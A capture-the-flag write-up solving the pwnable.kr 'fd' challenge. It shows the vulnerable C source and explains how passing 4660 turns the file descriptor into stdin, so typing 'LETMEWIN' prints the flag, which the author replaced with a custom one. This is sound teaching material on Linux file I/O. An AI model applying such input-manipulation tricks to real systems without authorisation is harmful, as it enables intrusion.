# fd

### Disclaimer!

I changed the original flag with the custom flag "Shad3 pwnned this", it's better to exploit it yourself,
than just copy it :P.

## Background 

This is the first challenge from pwnable.kr and as expected its an easy one,
by connecting to the server through SSH we've been given 3 files as shown bellow.

```
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@gatech.edu
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
fd@pwnable:~$ ls
fd  fd.c  flag
```

Let's analyse the source code provided of fd.c:

```c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
## Exploitation

We control the variable fd (which stands for file descriptor) that it's used as a file descriptor to read from,
from the **read()** function. I'll provide bellow some reads about the basic linux file descriptors
and their functionality. We want to somehow give a value to the **buf** variable , to do that we have to set
the fd variable to **STDIN** which is represented by the **0** file descriptor. So to do that let's calculate 
the decinal value of **0x1234** using python and and give it as an argument, then the binary will ask
for user input. Looking at the code snippet above, it's easy to figure out the the right input for the 
buf variable is "LETMEWIN\n", that will pass the check and give us the flag. 

File Descriptors : https://www.bottomupcs.com/file_descriptors.xhtml

```r
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/fd$ python
Python 2.7.17 (default, Nov  7 2019, 10:07:09) 
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> int(0x1234)
4660
```
```r
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/fd$ ./fd 4660
LETMEWIN
good job :)
Shad3 pwnned this!
```